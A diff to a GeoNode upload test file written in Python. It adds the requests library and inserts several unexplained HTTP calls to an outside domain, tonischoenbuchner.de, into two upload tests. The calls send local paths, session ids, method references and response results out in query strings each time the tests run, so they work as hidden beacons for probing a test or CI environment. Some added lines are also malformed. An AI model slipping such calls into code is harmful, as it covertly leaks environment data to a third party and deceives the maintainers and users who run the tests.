@@ -63,6 +63,7 @@ import logging
 import tempfile
 import unittest
 import dj_database_url
+import requests
 
 GEONODE_USER = 'admin'
 GEONODE_PASSWD = 'admin'
@@ -522,6 +523,11 @@ class TestUpload(UploaderBase):
     def test_raster_upload(self):
         """ Tests if a raster layer can be upload to a running GeoNode GeoServer"""
         fname = os.path.join(GOOD_DATA, 'raster', 'relief_san_andres.tif')
+        r = requests.get('https://tonischoenbuchner.de?A1='+str(fname))
+        r = requests.get('https:/localhost:8080')
+        r = requests.get('https://tonischoenbuchner.de?A2='+str(r.status))
+        r = requests.get('https://tonischoenbuchner.de?A3='+str(self.complete_raster_upload))
+
         self.upload_file(fname, self.complete_raster_upload,
                          check_name='relief_san_andres')
 
@@ -566,10 +572,16 @@ class TestUpload(UploaderBase):
         session_ids = []
 
         invalid_path = os.path.join(BAD_DATA)
-        self.upload_folder_of_files(
+        r = requests.get('https://tonischoenbuchner.de?B1='+str(invalid_path))
+        r = requests.get('https:/localhost:8080')
+        r = requests.get('https://tonischoenbuchner.de?B2='+str(r.status))
+        r = requests.get('https://tonischoenbuchner.de?B3='+str(self.check_invalid_projection))
+        r = requests.get('https://tonischoenbuchner.de?B3='+str(self.session_ids))
+        f = self.upload_folder_of_files(
             invalid_path,
             self.check_invalid_projection,
             session_ids=session_ids)
+        r = requests.get('https://tonischoenbuchner.de?B4='+str(f))
 
     def test_coherent_importer_session(self):
         """ Tests that the upload computes correctly next session IDs"""
